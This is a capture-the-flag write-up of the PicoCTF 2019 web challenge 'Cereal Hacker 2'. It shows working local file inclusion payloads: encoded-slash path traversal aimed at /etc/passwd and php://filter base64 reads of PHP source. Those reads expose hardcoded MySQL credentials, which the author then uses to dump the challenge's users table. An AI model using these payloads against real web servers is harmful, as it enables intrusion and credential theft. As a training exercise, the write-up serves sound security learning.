---
title: "PicoCTF 2019: Cereal Hacker 2"
date: 2019-12-21T22:03:23+01:00
draft: true
categories:
  - infosec
tags:
  - ctf
  - infosec
  - picoctf
  - writeup
---

A couple of weeks ago, two of my friends and I participated in the yearly PicoCTF competition. As we're not students we participated in the global, open leaderboard and managed to climb to 112 out of 15817 participating teams. 🥳 <!--more-->

**Category:** Web Exploitation<br/>
**Points:** 500<br/>

> Get the admin's password. https://2019shell1.picoctf.com/problem/62195/ or http://2019shell1.picoctf.com:62195

---

## Initial reconnaissance

When you first visit the linked webpage you're presented with this:
![cerealhacker2-first-screen](/images/cereal-hacker-login-page.png)

Look at that! A pretty regular login page for what, by the looks of it, is a run-of-the-mill corporate in-house application.

### What can this page tell us?
* The web server is either running, or pretends to be running, PHP.
* We have access to a query parameter named file that seems to be pointing at the current php page.
* Switching the file url to something else, like `potato`, produces the standard PHP 404 error message: `Unable to locate potato.php`  
* Inspecting the source (or DOM) yields nothing of particular interest
* There are no client-side shenanigans in play

By knowing it's a php server, using the file parameter to render specific pages, is a great start and should help us in doing some additional enumeration.

Let's start by trying to figure out some of the available pages by just guessing common filenames for web pages and enter them as the value for the file key.

---

If we enter `foot` or `head`, the response is just an empty page, which means our "attack" actually does something and that indeed, these files seem to exist. Trying `admin` we get even closer to something tangible:

![cerealhacker2-admin-screen](/images/cereal-hacker-not-admin.png)

Interesting!

It's also possible to access the admin.php directly, without using the file parameter. However, this excludes all CSS, which confirms that the page is actually just rendered as a fragment or part inside index.php.

Armed with this knowledge, it would be interesting to see whether we can do any path traversal or for that matter get the server to echo the raw php content.

Let's try path traversals first:
```bash
$ curl https://2019shell1.picoctf.com/problem/62195/../../../../../../../etc/passwd
<html>
<head><title>404 Not Found</title></head>
<body bgcolor="white">
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>
</body>
</html>
$ 
```

Well, I guess we should have expected as much. If that would have been possible, this problem wouldn't have deserved 500 points. And `https://2019shell1.picoctf.com/problem/62195?file=/../../../../../../../../../etc/passwd` does not work either, too bad!

What if we encode the slash? The hex code for a forward slash is %2F, so let's try substituting the slashes with that:
```shell
$ curl https://2019shell1.picoctf.com/problem/62195/index.php?file=..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

$
```

Bingo! That renders a blank page instead of the usual message about the file not being found! So, it's actually allowing us to escape the web server root! But it's still not returning anything.

## What have we learned this far?

* Path traversal using actual slashes are handled by the browser and are interpreted relative to the actual url path, not the file system path, which we're after.
* Switching the slashes to their hex equivalent, `%2F` allows us to bypass this behavior and have the php engine interpret it instead, thus allowing us to do path traversal.
* This exploit alone wont allow us to solve the challenge as it doesn't echo any file content. We need to dig further.
* By removing one ..%2F at the time, we can deduce that we're three levels down from the root, as `..%2f..%2fetc%2fpasswd` gives us the regular PHP file not found message.

---

## Enter PHP Filters
If there where only a way to echo the raw php code back to the client... 😅

Turns out there is! There's a known vulnerability in php's local file inclusion allowing us to encode the content as base64 using the php://filter. This vulnerability has been around since PHP 5.0 and is described in detail [here](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion).

So, let's try that admin page again, but this time using php filter to encode it as base64:

```shell
$ curl https://2019shell1.picoctf.com/problem/62195/index.php?file=php://filter/convert.base64-encode/resource=admin

PD9waHAKCnJlcXVpcmVfb25jZSgnY29va2llLnBocCcpOwoKaWYoaXNzZXQoJHBlcm0p[ICYmICRwZX...
$
```


Aha! Let's convert that to something a bit more.... uhm... readable. Other than the expected markup which we've already seen, we can find this sitting in the top:

```php
<?php
  require_once('cookie.php');
  if(isset($perm) && $perm->is_admin()){
?>
```

That in and by itself won't get us anywhere, so we'll continue by looking at `cookie.php`

```php
<?php

require_once('../sql_connect.php');

// I got tired of my php sessions expiring, so I just put all my useful information in a serialized cookie
class permissions
{
	public $username;
	public $password;
	
	function __construct($u, $p){
		$this->username = $u;
		$this->password = $p;
	}

	function is_admin(){
		global $sql_conn;
		if($sql_conn->connect_errno){
			die('Could not connect');
		}
		//$q = 'SELECT admin FROM pico_ch2.users WHERE username = \''.$this->username.'\' AND (password = \''.$this->password.'\');';
		
		if (!($prepared = $sql_conn->prepare("SELECT admin FROM pico_ch2.users WHERE username = ? AND password = ?;"))) {
		    die("SQL error");
		}
[...]
```

Now how about that! Let's check the `sql_connect.php` file as well!

```php
<?php
  $sql_server = 'localhost';
  $sql_user = 'mysql';
  $sql_pass = 'this1sAR@nd0mP@s5w0rD#%';
  $sql_conn = new mysqli($sql_server, $sql_user, $sql_pass);
  $sql_conn_login = new mysqli($sql_server, $sql_user, $sql_pass);
?>
```

And with that, we'll now be able to connect to the actual mysql database.
Let's fire up a shell and try it out:

```bash
0x12b@pico-2019-shell1:~$ mysql -u mysql -p

Enter password: this1sAR@nd0mP@s5w0rD#%

Welcome to the MySQL monitor. Commands end with ; or \g.
Your MySQL connection id is 1349801
Server version: 5.7.27-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| pico_ch1           |
| pico_ch2           |
+--------------------+
3 rows in set (0.00 sec)

mysql> use pico_ch2
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;

+--------------------+
| Tables_in_pico_ch2 |
+--------------------+
| users              |
+--------------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----+--------------+-------------------------------------------+-------+
| id | username     | password                                  | admin |
+----+--------------+-------------------------------------------+-------+
|  1 | admin        | picoCTF{c9f6ad462c6bb64a53c6e7a6452a6eb7} |     1 |
|  2 | regular_user | b283531e09ee2228b7a16249ea91c4b3          |     0 |
|  3 | red_herring  | 7cef39bd6db2122e3309dbef4b86cca8          |     0 |
+----+--------------+-------------------------------------------+-------+
3 rows in set (0.00 sec)

mysql>

```

And there we have it, folks - the flag!

`picoCTF{c9f6ad462c6bb64a53c6e7a6452a6eb7}`

---

If you enjoyed this write-up and would like me to continue writing more about CTF's and how me and my team solves them, let me know by smashing the heart button and following me.

Thanks for reading! 🙏🏼